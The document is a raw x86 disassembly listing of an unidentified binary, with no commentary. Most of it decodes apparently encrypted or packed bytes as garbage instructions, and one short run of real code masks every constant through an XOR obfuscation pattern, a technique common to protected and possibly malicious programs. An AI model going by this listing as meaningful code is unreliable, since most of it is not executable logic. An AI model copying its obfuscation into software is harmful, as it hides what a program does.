  40febd:	loope  0x40fed4
  40febf:	loop   0x40feea
  40fec1:	pushf  
  40fec2:	fstp   QWORD PTR [eax]
  40fec4:	call   0xdf9e1ad5
  40fec9:	sub    DWORD PTR [edx+edx*1+0x992caf2],ebp
  40fed0:	ret    
  40fed1:	xor    bl,BYTE PTR [eax+0x3caa81f8]
  40fed7:	aad    0x59
  40fed9:	adc    BYTE PTR [eax-0x1e],dh
  40fedc:	mov    edi,0xbd8e8fef
  40fee1:	sub    BYTE PTR [ebx+esi*1+0x56],al
  40fee5:	mov    ds:0x649206da,al
  40feea:	pop    DWORD PTR [edx-0x55029694]
  40fef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef1:	and    bl,BYTE PTR [eax]
  40fef3:	mov    ecx,0x8fb69dc4
  40fef8:	adc    DWORD PTR [esi],0xffffffcd
  40fefb:	inc    ebx
  40fefc:	mov    ds:0x99fa92a7,al
  40ff01:	pusha  
  40ff02:	mov    ch,0x55
  40ff04:	inc    ebp
  40ff05:	pop    eax
  40ff06:	sbb    al,0xa6
  40ff08:	xor    esi,DWORD PTR [esi+0xa]
  40ff0b:	test   DWORD PTR [eax+0x7b],ebp
  40ff0e:	and    eax,0xfc5575e2
  40ff13:	sahf   
  40ff14:	(bad)  
  40ff15:	jne    0x40ff7f
  40ff17:	inc    ebp
  40ff18:	sbb    ebp,DWORD PTR [ebx+edx*8+0x2b6f6ac0]
  40ff1f:	push   0x4d
  40ff21:	ficomp WORD PTR [ebp+0x3]
  40ff24:	and    bl,BYTE PTR [ebx]
  40ff26:	mov    fs,WORD PTR [ebp+0x1145f29e]
  40ff2c:	pushaw 
  40ff2e:	add    esp,esi
  40ff30:	cwde   
  40ff31:	and    eax,0x1e5c906d
  40ff36:	cmp    ebx,esi
  40ff38:	push   esi
  40ff39:	pop    es
  40ff3a:	xchg   edi,eax
  40ff3b:	sbb    ebp,0xd955e004
  40ff41:	pop    eax
  40ff42:	dec    edx
  40ff43:	push   cs
  40ff44:	lahf   
  40ff45:	and    ch,BYTE PTR [ecx]
  40ff47:	stc    
  40ff48:	pop    ecx
  40ff49:	scas   eax,DWORD PTR es:[edi]
  40ff4a:	jmp    0xce03a7ec
  40ff4f:	pop    es
  40ff50:	test   BYTE PTR [eax+esi*4],bl
  40ff53:	xchg   ecx,eax
  40ff54:	in     eax,0x6e
  40ff56:	ins    DWORD PTR es:[edi],dx
  40ff57:	daa    
  40ff58:	mov    ch,0xab
  40ff5a:	(bad)  
  40ff5b:	repnz adc BYTE PTR [eax+0x0],bh
  40ff5f:	or     eax,0xefae48c1
  40ff64:	dec    eax
  40ff65:	mov    al,ds:0xf5a087ac
  40ff6a:	jl     0x40ffbb
  40ff6c:	popa   
  40ff6d:	mov    eax,0xdfcb1be
  40ff72:	inc    edx
  40ff73:	or     bh,cl
  40ff75:	js     0x40ff3d
  40ff77:	ja     0x40ff6e
  40ff79:	push   ss
  40ff7a:	mov    ah,0x61
  40ff7c:	mov    dl,0xf3
  40ff7e:	adc    edx,ebp
  40ff80:	inc    esp
  40ff81:	scas   al,BYTE PTR es:[edi]
  40ff82:	sub    al,0x61
  40ff84:	gs (bad) 
  40ff86:	stos   DWORD PTR es:[edi],eax
  40ff87:	pusha  
  40ff88:	call   0xdb16dcf8
  40ff8d:	enter  0xb35d,0x14
  40ff91:	in     al,dx
  40ff92:	rcl    DWORD PTR [eax-0x5c7eefb1],1
  40ff98:	sub    ch,BYTE PTR [edi]
  40ff9a:	arpl   sp,bp
  40ff9c:	inc    ebx
  40ff9d:	sub    edi,DWORD PTR [edi+edx*1]
  40ffa0:	mov    esi,0x35eedbe5
  40ffa5:	jecxz  0x40ff6f
  40ffa7:	adc    eax,0xdfe8ff82
  40ffac:	adc    al,0xbd
  40ffae:	(bad)  
  40ffaf:	dec    ebp
  40ffb0:	cli    
  40ffb1:	sar    ah,0x76
  40ffb4:	aas    
  40ffb5:	xchg   ebp,eax
  40ffb6:	sub    eax,0x201e791d
  40ffbb:	jecxz  0x40ffad
  40ffbd:	inc    edi
  40ffbe:	lea    esi,[ebx+0x1c]
  40ffc1:	dec    esi
  40ffc2:	add    edi,DWORD PTR [edi+eiz*8+0x58]
  40ffc6:	(bad)  
  40ffc7:	cmp    BYTE PTR ds:0x39dc420c,ah
  40ffcd:	mov    al,ds:0x61898f02
  40ffd2:	push   ebp
  40ffd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffd4:	(bad)
  40ffd7:	stc    
  40ffd8:	and    DWORD PTR [ebp-0x708d3700],ebx
  40ffde:	inc    ebp
  40ffdf:	fs (bad) 
  40ffe2:	sbb    cl,BYTE PTR [ebx+eiz*1-0x4d515849]
  40ffe9:	ss jo  0x410063
  40ffec:	xlat   BYTE PTR ds:[ebx]
  40ffed:	add    al,0x39
  40ffef:	and    DWORD PTR [edx+0x26],ebp
  40fff2:	out    dx,eax
  40fff3:	add    edi,DWORD PTR [edi-0x45]
  40fff6:	add    bl,al
  40fff8:	ja     0x40ff9b
  40fffa:	sub    ah,BYTE PTR [edx+edx*8]
  40fffd:	ret    0xa38a
  410000:	and    al,0x8c
  410002:	jnp    0x410078
  410004:	ret    
  410005:	xchg   edx,eax
  410006:	pop    eax
  410007:	push   ds
  410008:	pop    ebp
  410009:	repnz rcl DWORD PTR [eax],0xe5
  41000d:	mov    edi,fs
  41000f:	ror    ch,0x99
  410012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410013:	jae    0x410076
  410015:	xchg   ebx,eax
  410016:	add    al,0x0
  410018:	sub    DWORD PTR [eax+0x22],esp
  41001b:	mov    ebx,0xd9c79816
  410020:	data16 jo 0x41002c
  410023:	retf   
  410024:	and    DWORD PTR [esi+ecx*2],edi
  410027:	push   edi
  410028:	lds    ebx,FWORD PTR [ecx]
  41002a:	mov    al,0xee
  41002c:	mov    BYTE PTR [edx+ecx*8-0x4e],dh
  410030:	stos   BYTE PTR es:[edi],al
  410031:	mov    dl,0xfd
  410033:	add    eax,0xee42b4c0
  410038:	adc    ecx,DWORD PTR [ecx-0x71dc6a0e]
  41003e:	jb     0x4100a0
  410040:	push   edi
  410041:	shld   DWORD PTR [ebp*2+0x216fafeb],esp,0x32
  41004a:	pop    esi
  41004b:	cmp    bl,BYTE PTR [eax]
  41004d:	std    
  41004e:	fdiv   DWORD PTR [eax]
  410050:	and    al,ch
  410052:	inc    ebp
  410053:	xchg   ecx,eax
  410054:	es sahf 
  410056:	jne    0x410005
  410058:	shl    edi,cl
  41005a:	fs rol dl,1
  41005d:	shr    dh,0x1c
  410060:	rep lods al,BYTE PTR ds:[esi]
  410062:	fsub   DWORD PTR [eax-0x2ea4fb1]
  410068:	test   DWORD PTR [ecx+0x516a22c],edi
  41006e:	xchg   ebx,eax
  41006f:	mov    bl,0xf4
  410071:	sub    dh,cl
  410073:	mov    al,0x94
  410075:	mov    ecx,0xfbe6952b
  41007a:	enter  0xe90c,0x60
  41007e:	mov    ebx,0xd814dfd2
  410083:	xchg   ecx,edi
  410085:	jno    0x4100a7
  410087:	shl    BYTE PTR [eax-0x66],0x8b
  41008b:	ret    0x5092
  41008e:	inc    esp
  41008f:	sbb    DWORD PTR [ecx],0xd
  410092:	xchg   DWORD PTR [edi-0x580b49c4],ebp
  410098:	int    0x1b
  41009a:	pushf  
  41009b:	mov    ebp,0xedf11cbd
  4100a0:	stos   BYTE PTR es:[edi],al
  4100a1:	cwde   
  4100a2:	cli    
  4100a3:	push   eax
  4100a4:	fimul  DWORD PTR [ecx+edi*1-0x2f]
  4100a8:	dec    ebx
  4100a9:	mov    esi,0x165a3315
  4100ae:	dec    ecx
  4100af:	pop    ebx
  4100b0:	(bad)  
  4100b1:	arpl   WORD PTR [esi+0x5c2dddad],ax
  4100b7:	or     BYTE PTR [eax-0x38d33ef5],0x47
  4100be:	or     BYTE PTR [esi+ebp*4],ah
  4100c1:	pop    edi
  4100c2:	and    dl,BYTE PTR [esi]
  4100c4:	std    
  4100c5:	scas   eax,DWORD PTR es:[edi]
  4100c6:	push   edx
  4100c7:	jne    0x41004d
  4100c9:	fcos   
  4100cb:	mov    edi,0x264970cf
  4100d0:	test   ecx,eax
  4100d2:	push   edx
  4100d3:	aam    0x2b
  4100d5:	ja     0x41006a
  4100d7:	fistp  WORD PTR [edx+0x70]
  4100da:	mov    ss,WORD PTR [ebx+0x83dd0e3]
  4100e0:	lods   al,BYTE PTR ds:[esi]
  4100e1:	mov    cl,0x7f
  4100e3:	mov    edx,0x36b1dcb2
  4100e8:	test   DWORD PTR [ebp+edi*1-0x7b],ebx
  4100ec:	mov    ebp,0xc248135d
  4100f1:	xchg   esi,eax
  4100f2:	mov    BYTE PTR [eax+0x54e505d6],dl
  4100f8:	push   ecx
  4100f9:	cmp    eax,0xd2599d6d
  4100fe:	test   al,0x57
  410100:	div    ecx
  410102:	call   0x35ee:0x5dc07854
  410109:	or     al,0x9c
  41010b:	rcr    DWORD PTR [edx],1
  41010d:	add    BYTE PTR [esp+ebx*2+0x18049e2f],bh
  410114:	(bad)  
  410115:	shr    BYTE PTR [ebx-0x3c9ec77f],1
  41011b:	push   esi
  41011c:	data16 rol BYTE PTR es:[eax+ebx*8],cl
  410121:	lahf   
  410122:	sbb    cl,BYTE PTR [ebp+0x2a]
  410125:	mov    bl,0xff
  410127:	mov    ebx,0xc9801f4b
  41012c:	(bad)  [esi]
  41012e:	rcr    ebx,0xa7
  410131:	adc    ch,BYTE PTR [edx+ecx*8-0x29]
  410135:	cmp    BYTE PTR [ebx-0x4236951d],al
  41013b:	xchg   edi,eax
  41013c:	sbb    BYTE PTR [edi-0x3b],0x7a
  410140:	and    al,0x44
  410142:	xchg   esi,eax
  410143:	and    bh,bl
  410145:	cdq    
  410146:	repz mov bl,0xfd
  410149:	add    al,0x64
  41014b:	dec    edi
  41014c:	xor    eax,0x72268ba9
  410151:	out    dx,eax
  410152:	xchg   esi,eax
  410153:	and    BYTE PTR [esp+eax*1],0x92
  410157:	mov    bl,0x5a
  410159:	push   ebp
  41015a:	mov    ah,0x1e
  41015c:	and    BYTE PTR [ebx-0x4a22110a],ah
  410162:	push   0xe
  410164:	cdq    
  410165:	or     bh,BYTE PTR [edi-0x5]
  410168:	inc    ebx
  410169:	mov    eax,0x1bd8363d
  41016e:	mov    edx,0x52da0375
  410173:	lods   eax,DWORD PTR es:[esi]
  410175:	idiv   ebx
  410177:	jl     0x410129
  410179:	push   ss
  41017a:	ins    DWORD PTR es:[edi],dx
  41017b:	daa    
  41017c:	sbb    DWORD PTR [edx-0x31],ecx
  41017f:	(bad)  
  410180:	pusha  
  410181:	xor    DWORD PTR [edx+0x57],0xbb5def63
  410188:	mov    ah,0x89
  41018a:	outs   dx,BYTE PTR ds:[esi]
  41018b:	jle    0x4101c8
  41018d:	cmp    BYTE PTR [ebx-0x2a],dl
  410190:	aam    0xfc
  410192:	loopne 0x410146
  410194:	repnz dec eax
  410196:	ret    
  410197:	push   esi
  410198:	xor    al,0xe4
  41019a:	mov    eax,0xa110fa9c
  41019f:	pop    eax
  4101a0:	sti    
  4101a1:	(bad)  
  4101a2:	dec    ebp
  4101a3:	mov    al,ds:0x90e74ad8
  4101a8:	sub    ax,0x2a39
  4101ac:	inc    ecx
  4101ad:	aas    
  4101ae:	pushf  
  4101af:	iret   
  4101b0:	mov    edx,0xd316c24c
  4101b5:	inc    ecx
  4101b6:	cmp    ebx,DWORD PTR [edi+0x16]
  4101b9:	pop    edx
  4101ba:	(bad)  
  4101bc:	mov    edx,0x4c751f7f
  4101c1:	push   eax
  4101c2:	jl     0x410192
  4101c4:	in     al,dx
  4101c5:	ss inc eax
  4101c7:	sti    
  4101c8:	xor    BYTE PTR [esi],cl
  4101ca:	or     dl,BYTE PTR [esi+edi*4+0x76d69829]
  4101d1:	inc    edx
  4101d2:	dec    edx
  4101d3:	test   BYTE PTR [edi],ah
  4101d5:	sar    dh,1
  4101d7:	cdq    
  4101d8:	call   DWORD PTR [esi-0x30137b73]
  4101de:	in     al,0x1
  4101e0:	jmp    0xf1ff60b0
  4101e5:	out    0x68,eax
  4101e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e8:	xor    edx,DWORD PTR [esi+0x55]
  4101eb:	dec    eax
  4101ec:	in     eax,0xde
  4101ee:	inc    ecx
  4101ef:	stos   DWORD PTR es:[edi],eax
  4101f0:	aaa    
  4101f1:	jnp    0x4101d9
  4101f3:	fs mov ds:0x5e02fe47,al
  4101fa:	inc    edi
  4101fb:	fmul   QWORD PTR ds:0x946b0efa
  410201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410202:	jb     0x410255
  410204:	push   edx
  410205:	jb     0x410252
  410207:	adc    DWORD PTR [edx],edx
  410209:	adc    al,0x6c
  41020b:	retf   
  41020c:	out    0x5a,al
  41020e:	int3   
  41020f:	fiadd  WORD PTR [eax]
  410211:	add    al,0xb9
  410213:	dec    esp
  410214:	inc    edx
  410215:	fadd   QWORD PTR [ebp+edi*8-0x55]
  410219:	push   ebx
  41021a:	pop    ds
  41021b:	das    
  41021c:	mov    dh,0xd3
  41021e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41021f:	shr    ecx,cl
  410221:	mov    al,0x3d
  410223:	pop    ebx
  410224:	iret   
  410225:	iret   
  410226:	ret    0xeaf8
  410229:	out    dx,eax
  41022a:	push   ebx
  41022b:	push   ecx
  41022c:	test   edi,edx
  41022e:	inc    eax
  41022f:	or     ebp,DWORD PTR [ebx+0x12]
  410232:	lock ins BYTE PTR es:[edi],dx
  410234:	pushf  
  410235:	ret    0x932e
  410238:	ins    BYTE PTR es:[edi],dx
  410239:	mov    al,ds:0xc703cf45
  41023e:	imul   eax,ebx
  410241:	cmp    eax,edx
  410243:	ja     0x4191d2
  410249:	mov    edx,DWORD PTR [ebp-0x10]
  41024c:	mov    eax,DWORD PTR [ebp-0x14]
  41024f:	mov    ebx,DWORD PTR [ebp-0x28]
  410252:	sub    eax,edx
  410254:	xor    ebx,esi
  410256:	xor    edx,edx
  410258:	add    ebx,edi
  41025a:	div    ebx
  41025c:	mov    DWORD PTR [ebp-0x8],eax
  41025f:	mov    eax,DWORD PTR [ebp-0x2c]
  410262:	mov    edx,DWORD PTR [ebp-0x8]
  410265:	xor    eax,esi
  410267:	add    eax,edi
  410269:	cmp    edx,eax
  41026b:	jbe    0x41027b
  410271:	mov    eax,DWORD PTR [ebp-0x2c]
  410274:	xor    eax,esi
  410276:	add    eax,edi
  410278:	mov    DWORD PTR [ebp-0x8],eax
  41027b:	mov    eax,DWORD PTR [ebp-0x28]
  41027e:	mov    edx,DWORD PTR [ebp-0x8]
  410281:	xor    eax,esi
  410283:	add    eax,edi
  410285:	imul   eax,edx
  410288:	mov    DWORD PTR [ebp-0x8],eax
  41028b:	mov    eax,DWORD PTR [ebp-0x3c]
  41028e:	mov    edx,DWORD PTR [ebp-0x8]
  410291:	xor    eax,esi
  410293:	add    eax,edi
  410295:	cmp    edx,eax
  410297:	je     0x4191bb
  41029d:	mov    eax,DWORD PTR [ebp-0x8]
  4102a0:	mov    DWORD PTR [ebp-0x20],eax
  4102a3:	mov    eax,DWORD PTR [ebp-0x10]
  4102a6:	add    eax,DWORD PTR [ebp-0x40]
  4102a9:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  4102b0:	mov    DWORD PTR [ebp-0x8],eax
  4102b3:	mov    eax,0xf89c85b5
  4102b8:	mov    DWORD PTR [ebp-0x1c],eax
  4102bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  4102c2:	mov    DWORD PTR [ebp-0x30],eax
  4102c5:	mov    eax,DWORD PTR [ebp-0x24]
  4102c8:	xor    eax,esi
  4102ca:	add    eax,edi
  4102cc:	jmp    0x416dfa
  4102d1:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  4102d8:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4102df:	mov    eax,DWORD PTR [ebp-0x30]
  4102e2:	mov    edx,DWORD PTR [ebp-0xc]
  4102e5:	xor    eax,esi
  4102e7:	add    eax,edi
  4102e9:	imul   eax,edx
  4102ec:	mov    edx,DWORD PTR [ebp-0x1c]
  4102ef:	xor    edx,esi
  4102f1:	add    eax,edx
  4102f3:	mov    edx,DWORD PTR [ebp-0x8]
  4102f6:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  4102fd:	mov    BYTE PTR [ebp-0x1],al
  410300:	mov    eax,DWORD PTR [ebp-0x1c]
  410303:	mov    edx,DWORD PTR [ebp-0x1c]
  410306:	xor    eax,esi
  410308:	xor    edx,esi
  41030a:	lea    ebx,[eax+edx*1+0x64e5b6]
  410311:	mov    eax,DWORD PTR [ebp-0xc]
  410314:	xor    edx,edx
  410316:	div    ebx
  410318:	mov    eax,DWORD PTR [ebp-0x1c]
  41031b:	xor    eax,esi
  41031d:	add    eax,edi
  41031f:	cmp    edx,eax
  410321:	mov    eax,DWORD PTR [ebp-0x30]
  410324:	mov    edx,DWORD PTR [ebp-0xc]
  410327:	jmp    0x41269c
  41032c:	lods   al,BYTE PTR ds:[esi]
  41032d:	jbe    0x410322
  41032f:	loop   0x4102d4
  410331:	jmp    DWORD PTR [ebx-0x2d50dedc]
  410337:	into   
  410338:	pop    ebp
  410339:	aad    0x19
  41033b:	mov    ch,0xbf
  41033d:	mov    fs,WORD PTR [edx+0x62]
  410340:	or     bl,BYTE PTR [edi+0x62]
  410343:	bound  ebp,QWORD PTR [ecx+0x47]
  410346:	lea    esp,ds:0xbb50e18b
  41034c:	test   eax,0x6f58e9b5
  410351:	jge    0x410347
  410353:	(bad)  
  410354:	addr16 addr16 dec edi
  410357:	add    DWORD PTR [ebx-0x60],0x6565bd84
  41035e:	pop    ebx
  41035f:	out    0xcd,eax
  410361:	inc    esp
  410362:	and    cl,BYTE PTR [eax+0x2d5a7a91]
  410368:	sti    
  410369:	sbb    al,BYTE PTR [ebp+0xc]
  41036c:	mov    eax,ds:0x4bd051db
  410371:	(bad)
  410375:	or     DWORD PTR [ebx+0x55],edx
  410378:	fisttp WORD PTR [ecx]
  41037a:	push   0x969cff82
  41037f:	mov    esi,0xbcb39568
  410384:	out    dx,eax
  410385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410386:	fimul  WORD PTR [edx-0x80]
  410389:	rcl    DWORD PTR [esi],0xa9
  41038c:	mov    bh,0x36
  41038e:	loopne 0x410400
  410390:	xchg   esi,eax
  410391:	and    al,0xb
  410393:	inc    edi
  410394:	cmp    ebp,DWORD PTR [ecx-0x2]
  410397:	push   ss
  410398:	inc    edi
  410399:	or     esp,DWORD PTR [ecx]
  41039b:	enter  0xbff2,0x3a
  41039f:	pop    ss
  4103a0:	je     0x410354
  4103a2:	mov    cl,0xd8
  4103a4:	inc    eax
  4103a5:	mov    edx,0x16a19cc3
  4103aa:	add    BYTE PTR [edi+0x374579ff],dh
  4103b0:	ror    al,cl
  4103b2:	dec    ebp
  4103b3:	push   0x70
  4103b5:	or     DWORD PTR [edi-0x19f9424e],ecx
  4103bb:	out    dx,al
  4103bc:	xor    BYTE PTR [ebp-0x7a5ebf98],bl
  4103c2:	fs xchg esp,eax
  4103c4:	xchg   esi,eax
  4103c5:	stos   DWORD PTR es:[edi],eax
  4103c6:	retf   0x60a7
  4103c9:	add    DWORD PTR [edi+0x24],ecx
  4103cc:	jmp    0x4103ac
  4103ce:	mov    dl,BYTE PTR [edi+ebp*2-0x3b118b70]
  4103d5:	fs push es
  4103d7:	scas   eax,DWORD PTR es:[edi]
  4103d8:	retf   
  4103d9:	addr16 pusha 
  4103db:	add    DWORD PTR [eax+0x9879bad],ebp
  4103e1:	jb     0x410462
  4103e3:	xchg   ecx,edx
  4103e5:	(bad)  
  4103e6:	mov    al,ds:0xf6a11681
  4103eb:	jl     0x4103b9
  4103ed:	fxtract 
  4103ef:	jno    0x41041b
  4103f1:	inc    edi
  4103f2:	iret   
  4103f3:	xor    esp,DWORD PTR [edi-0x55da9491]
  4103f9:	mov    eax,0x39331e81
  4103fe:	sbb    dl,ah
  410400:	imul   edx,DWORD PTR [edx],0xffffff8c
  410403:	and    DWORD PTR [edi+0x78130ff5],ecx
  410409:	or     BYTE PTR [eax-0x2d],0x65
  41040d:	je     0x4103d4
  41040f:	cmp    ebp,DWORD PTR [edx+esi*1-0x111d162c]
  410416:	mov    dl,0xfb
  410418:	loope  0x4103b9
  41041a:	and    eax,0xc8f9dc10
  41041f:	cmp    eax,0xf06d6e09
  410424:	popa   
  410425:	imul   esp,DWORD PTR [edi+0x250eae50],0xd03b34b3
  41042f:	inc    ecx
  410430:	adc    ebp,DWORD PTR [ebp+0x3095f3a6]
  410436:	xchg   ebx,eax
  410437:	ret    0x3735
  41043a:	sbb    eax,0xfa07fa4b
  41043f:	adc    DWORD PTR [edx-0x7f],edx
  410442:	sbb    ah,BYTE PTR [edi-0x58]
  410445:	sub    BYTE PTR [eax-0x39],bl
  410448:	out    dx,eax
  410449:	inc    ecx
  41044a:	dec    edi
  41044b:	daa    
  41044c:	mov    ds:0xcfdf4bf2,al
  410451:	fild   DWORD PTR [ecx-0x69]
  410454:	mov    bl,0xc8
  410456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410457:	pop    edx
  410458:	bound  edx,QWORD PTR [edx-0x7f27b29f]
  41045e:	icebp  
  41045f:	xor    eax,0x45032528
  410464:	push   ss
  410465:	icebp  
  410466:	pop    ebx
  410467:	fwait
  410468:	fs ret 0x504e
  41046c:	push   esi
  41046d:	add    BYTE PTR [eax-0x7c],dh
  410470:	mov    ecx,0x849a46b2
  410475:	add    eax,0x7db92711
  41047a:	popf   
  41047b:	cmp    ebx,esi
  41047d:	arpl   WORD PTR [esi],si
  41047f:	je     0x41041b
  410481:	push   edi
  410482:	sub    DWORD PTR [edi-0x4918ebcf],esp
  410488:	cwde   
  410489:	ss add al,0xeb
  41048c:	ficom  DWORD PTR [ebx+0xb]
  41048f:	ins    BYTE PTR es:[edi],dx
  410490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410491:	popf   
  410492:	stc    
  410493:	shr    DWORD PTR [esp+eax*1+0x41],1
  410497:	push   0x943e6656
  41049c:	div    BYTE PTR [esi]
  41049e:	stos   BYTE PTR es:[edi],al
  41049f:	(bad)  
  4104a1:	dec    esp
  4104a2:	mov    edi,0xed6795bd
  4104a7:	ror    DWORD PTR [ebx-0x38b44e06],1
  4104ad:	mov    edx,0x26f1ceaa
  4104b2:	adc    al,0x21
  4104b5:	push   0xebcb6ee3
  4104ba:	pop    ebp
  4104bc:	pop    ss
  4104bd:	jns    0x4104e6
  4104bf:	dec    ebp
  4104c0:	cmp    DWORD PTR [edx+0x745b9b59],esi
  4104c6:	sar    DWORD PTR [esi+0x5f5f34c8],0x12
  4104cd:	xor    bl,BYTE PTR [edx]
  4104cf:	popf   
  4104d0:	jmp    ebp
  4104d2:	pop    esi
  4104d3:	push   ebp
  4104d4:	pusha  
  4104d5:	aaa    
  4104d6:	pop    ds
  4104d7:	and    eax,DWORD PTR [ebx+ebp*2+0x37]
  4104db:	sub    al,0x84
  4104dd:	fst    st(5)
  4104df:	dec    ecx
  4104e0:	std    
  4104e1:	pop    ds
  4104e2:	mov    ds:0xf7043885,al
  4104e7:	xor    dh,dh
  4104e9:	pop    edx
  4104ea:	aad    0x3b
  4104ec:	call   0xfe5:0x16bda58d
  4104f3:	mov    eax,0xad0c7312
  4104f8:	outs   dx,BYTE PTR ds:[esi]
  4104f9:	adc    dh,dl
  4104fb:	sub    bh,BYTE PTR [edx+ebp*1]
  4104fe:	inc    eax
  4104ff:	test   bh,0x3f
  410502:	jmp    0x4b629a5
  410507:	jecxz  0x410552
  410509:	add    dl,BYTE PTR [edx+eax*8]
  41050c:	and    dh,BYTE PTR [ebx]
  41050e:	adc    al,0xb8
  410510:	add    eax,0xa02ea0f5
  410515:	adc    BYTE PTR [ecx],0xc0
  410518:	ja     0x410517
  41051a:	add    ah,BYTE PTR [esi]
  41051c:	add    esp,edx
  41051e:	push   ds
  41051f:	xchg   edx,eax
  410520:	jne    0x410517
  410522:	ret    
  410523:	mov    ds:0xbe2ffbda,al
  410528:	(bad)  [ebx]
  41052a:	imul   ecx,DWORD PTR [esi],0x25ac42cc
  410530:	ja     0x410541
  410532:	loop   0x410577
  410534:	inc    ebx
  410535:	aas    
  410536:	shl    ch,cl
  410538:	out    dx,eax
  410539:	hlt    
  41053a:	out    dx,al
  41053b:	dec    eax
  41053c:	rcl    DWORD PTR [edi+ebp*1],1
  41053f:	inc    ebp
  410540:	out    0x9f,al
  410542:	je     0x41053e
  410544:	outs   dx,BYTE PTR ds:[esi]
  410545:	fld    QWORD PTR [ebx-0x61dfa9f8]
  41054b:	les    eax,FWORD PTR ds:0x6903aaa7
  410551:	fimul  WORD PTR [ebp+0x15d3711b]
  410557:	js     0x4105a3
  410559:	call   0x983c:0x81ee441f
  410560:	stos   BYTE PTR es:[edi],al
  410561:	imul   eax,edx,0x88b97c44
  410567:	out    0x17,eax
  410569:	xchg   DWORD PTR [eax+0x7e3f145a],edx
  41056f:	dec    edx
  410570:	xor    ebx,esi
  410572:	mov    ?,WORD PTR [ebx-0x5c]
  410575:	cmp    al,0x18
  410577:	mul    BYTE PTR [ebx-0x1c]
  41057a:	mov    ch,0xfa
  41057c:	sub    bl,BYTE PTR [esi]
  41057e:	call   0x6ae3:0x8738b45
  410585:	jbe    0x410527
  410587:	jb     0x410527
  410589:	loopne 0x410515
  41058b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058c:	ds pusha 
  41058e:	cld    
  41058f:	shl    BYTE PTR [ecx],cl
  410591:	fsubr  QWORD PTR [esi+0x3]
  410594:	repnz push ss
  410596:	xchg   edx,eax
  410597:	lods   eax,DWORD PTR ds:[esi]
  410598:	or     esp,DWORD PTR [ecx]
  41059a:	mov    al,ds:0x4a9c353b
  41059f:	sub    eax,0x3494280b
  4105a4:	arpl   WORD PTR [ebp+eax*8+0x3dda34ec],sp
  4105ab:	jne    0x410597
  4105ad:	mov    cl,0x36
  4105af:	idiv   ebx
  4105b1:	clc    
  4105b2:	lahf   
  4105b3:	mov    bl,BYTE PTR [ebx-0x32]
  4105b6:	popfw  
  4105b8:	dec    ebp
  4105b9:	hlt    
  4105ba:	and    eax,0x17808b2
  4105bf:	clc    
  4105c0:	mov    dl,0xea
  4105c2:	push   ebx
  4105c3:	into   
  4105c4:	pop    eax
  4105c5:	jmp    0x31e9:0xf63a9792
  4105cc:	jg     0x410649
  4105ce:	data16 jge 0x410559
  4105d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105d2:	clc    
  4105d3:	push   es
  4105d4:	into   
  4105d5:	in     eax,0xad
  4105d7:	mov    BYTE PTR [ebx],dh
  4105d9:	and    edx,DWORD PTR ds:0x582b98cf
  4105df:	jp     0x410591
  4105e1:	ja     0x41056a
  4105e3:	push   eax
  4105e4:	inc    esi
  4105e5:	outs   dx,DWORD PTR ds:[esi]
  4105e6:	inc    ecx
  4105e7:	inc    edx
  4105e8:	in     al,dx
  4105e9:	stos   DWORD PTR es:[edi],eax
  4105ea:	pop    esp
  4105eb:	gs sbb edx,ebx
  4105ee:	add    DWORD PTR [edi],eax
  4105f0:	stos   DWORD PTR es:[edi],eax
  4105f1:	adc    DWORD PTR [edi-0x564b8ba0],ebp
  4105f7:	xchg   ecx,eax
  4105f8:	stos   DWORD PTR es:[edi],eax
  4105f9:	call   0xc5173543
  4105fe:	arpl   WORD PTR [ebx],bx
  410600:	mov    cl,0xb5
  410602:	sar    BYTE PTR [ecx-0x60b2f00b],cl
  410608:	jb     0x4105bb
  41060a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41060b:	bound  esp,QWORD PTR [eax+esi*8-0x134c43d7]
  410612:	ss gs xchg esp,eax
  410615:	lods   al,BYTE PTR ds:[esi]
  410616:	repz popa 
  410618:	pop    ds
  410619:	inc    esi
  41061a:	dec    eax
  41061b:	in     eax,dx
  41061c:	out    0x76,eax
  41061e:	and    ah,ch
  410620:	scas   eax,DWORD PTR es:[edi]
  410621:	test   DWORD PTR [eax+ebx*1-0x6efe5952],0x305de311
  41062c:	mov    dl,0x81
  41062e:	push   edi
  41062f:	fisubr DWORD PTR [edx+edi*2-0x36]
  410633:	xor    ebx,eax
  410635:	cmc    
  410636:	popf   
  410637:	pop    ebx
  410638:	mov    edx,0xfdad4645
  41063d:	adc    eax,0xc60d2535
  410642:	pop    edx
  410643:	pop    esp
  410644:	jns    0x4106ba
  410646:	xor    eax,edx
  410648:	leave  
  410649:	jb     0x410693
  41064b:	pop    ds
  41064c:	call   0x57df5919
  410651:	sbb    ah,dh
  410653:	or     BYTE PTR [ecx],ch
  410655:	dec    ebx
  410656:	adc    al,0x87
  410658:	shl    BYTE PTR [esi+0x1d],0x17
  41065c:	in     al,0x22
  41065e:	call   0x24e7:0x515d54f5
  410665:	push   cs
  410666:	add    al,0xae
  410668:	cdq    
  410669:	cmp    edi,esi
  41066b:	push   ds
  41066c:	push   ecx
  41066d:	imul   edi,DWORD PTR [eax+0x253895d9],0x52eef2be
  410677:	lods   al,BYTE PTR ds:[esi]
  410678:	inc    ecx
  410679:	cmp    eax,0x229dd054
  41067e:	test   eax,0x2ba0d362
  410683:	in     al,dx
  410684:	sbb    DWORD PTR [eax-0x1],0x1713e206
  41068b:	push   es
  41068c:	dec    dh
  41068e:	mov    bl,0x1d
  410690:	or     eax,0x9104746b
  410695:	arpl   bx,sp
  410697:	fcmovu st,st(2)
  410699:	ret    0x887f
  41069c:	cmp    al,0x2c
  41069e:	and    bh,0xc1
  4106a1:	pop    esi
